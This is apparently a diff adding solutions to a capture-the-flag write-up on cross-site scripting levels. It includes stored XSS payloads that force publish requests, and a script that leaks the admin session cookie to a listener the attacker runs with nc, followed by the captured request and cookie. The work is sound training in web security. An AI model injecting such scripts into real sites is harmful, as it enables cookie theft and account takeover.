@@ -123,7 +123,13 @@ The GET request that you'll trigger using fetch() or whatnot. You can, again, de
 
 ## Solution
 
+Publish post with message:
 
+```
+<script>
+fetch("http://challenge.localhost/publish");
+</script>
+```
 
 ---
 
@@ -137,13 +143,64 @@ Go figure out how to POST, and get the flag.
 
 ## Solution
 
+Publish post with message:
+
+```
+<script>
+fetch("http://challenge.localhost/publish", {method: "POST"});
+</script>
+```
+
 ---
 
 # 7
 
 ## Description
 
+Depending on the attacker's goals, what they might actually be after is the victim's entire account. For example, attackers might use XSS to exfiltrate victim authentication data and then use this data to take over the victim's account.
+
+Authentication data is often stored via browser cookies, such as what happened in Authentication Bypass 2 (but, typically, much more secure). If an attacker can leak these cookies, the result can be disastrous for the victim.
+
+This level stores the authentication data for the logged in user in a cookie. You must use XSS to leak this cookie so that you can, in turn, use it in a request to impersonate the admin user. This exfiltration will happen over HTTP to a server that you run, and everything you need is available via JavaScript's fetch() and its ability to access (some) site cookies.
 
 
 ## Solution
+
+![](assets/xss_7_attack.png)
+
+
+1. `fetch` call injection to html file
+
+```js
+<script>
+fetch("http://127.0.0.1:8888/", {
+  method: "GET",
+  credentials: "include", 
+  mode: "cors"           
+});
+</script>
+```
+
+2. run tcp server to capture http request on port 8888
+
+```
+hacker@web-security~xss-7:~$ nc -lv 127.0.0.1 8888
+Listening on localhost 8888
+Connection received on localhost 54162
+GET / HTTP/1.1
+Host: challenge.localhost:8888
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: http://challenge.localhost/
+Origin: http://challenge.localhost
+Connection: keep-alive
+Cookie: auth=admin|.QXygTN2wCM0YjMyEzW}
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Priority: u=4
+```
+
 
